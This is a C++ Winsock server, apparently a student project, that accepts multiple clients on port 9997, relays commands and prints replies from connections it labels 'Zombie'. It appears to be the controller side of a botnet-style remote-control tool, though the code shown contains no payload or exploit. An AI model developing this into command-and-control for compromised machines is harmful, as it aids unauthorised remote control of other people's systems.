#include <iostream>
#include <winsock2.h>
#include <WS2tcpip.h>
#include "D:\ESIREM\C++\LPC\LPC\LPC\Server.h"
#pragma comment(lib, "Ws2_32.lib")
#include <vector>
#include <thread>
#include <Windows.h>
#include "Animations.h"

void recv_t_old(Server* serv1)	
{
	while (!serv1->getExit())
	{
		char buffer[256]{ 0 };
		std::vector<st_Client> clients = serv1->getClients();
		for (int i = 0; i < clients.size(); i++)
		{
			recv(clients[i].sock, buffer, sizeof(buffer), 0);
			std::cout << "[*] Client " << clients[i].number << " : " << buffer <<std::endl;
			
		}
		Sleep(200);
	}
}
void listen_client(Server* serv1,const unsigned short nb)
{
	char buffer[256]={ 0 };

	std::cout << "Dans thread recv : " << nb << std::endl;

	while ( strcmp(buffer,"exit") != 0)
	{
		std::vector<st_Client> clients = serv1->getClients();
			if (recv(clients[nb].sock, buffer, sizeof(buffer), 0) > 0)
				std::cout << "[*] Zombie " << nb+1 << " : " << buffer << std::endl;
			else
				break;
			Sleep(400);		

	}
}
void accept_t(Server* serv1)
{
	while (serv1->getExit() != 1)
	{
		serv1->acceptClient();
		Sleep(1000);
	}
}
void send_t(Server* serv1)
{
	bool val = 1;
	while (val)
	{
		SetColor(8);
		val = serv1->send_c();
		SetColor(7);
	}
}

int main()
{
	const unsigned short port = 9997;
	std::vector<std::thread> thread_list;
	bool test = 0;
	int nb = 0;

	SetColor(14);
	Server* serv1 = new Server(port);
	SetColor(2);
	
	serv1->acceptClient();
	thread_list.push_back(std::thread(listen_client, serv1, nb));
	nb++;
	
	std::cout << "[*] Starting thread ..." << std::endl;
	std::thread t_send(send_t, serv1);
	
	std::cout << "[*] Done" << std::endl;
	Sleep(2000);
	system("cls");
	Animations::Welcome();
	
	while (serv1->getError() != 1)
	{
		test = serv1->acceptClient();
		if (test)
		{
			thread_list.push_back(std::thread(listen_client, serv1, nb));
			nb++;
		}
		Sleep(500);
	}

	std::cout << "[*] Closing thread ..." << std::endl;
	delete serv1;
	t_send.join();
	for (int i = 0; i < thread_list.size(); i++)
	{
		thread_list[i].join();
	}
	std::cout << "[*] Done" << std::endl;
}
